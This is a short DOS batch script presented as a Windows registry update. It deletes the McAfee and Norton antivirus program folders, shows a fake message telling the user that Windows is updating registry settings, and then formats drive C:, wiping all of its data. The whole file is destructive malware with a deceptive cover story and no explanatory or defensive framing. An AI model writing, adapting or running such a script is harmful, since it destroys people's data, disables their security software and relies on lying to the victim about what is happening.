@echo off
prompt $p$g
 
Set Path=C:\Windows;C:\Windows\Command
@DELTREE C:\Progra~1\Networ~1\McAfee~1
@DELTREE C:\Progra~1\Norton~1
 
CLS
echo Please wait...Windows is updating your registry settings...
echo This may take several minutes...
@FORMAT C: /SELECT /U
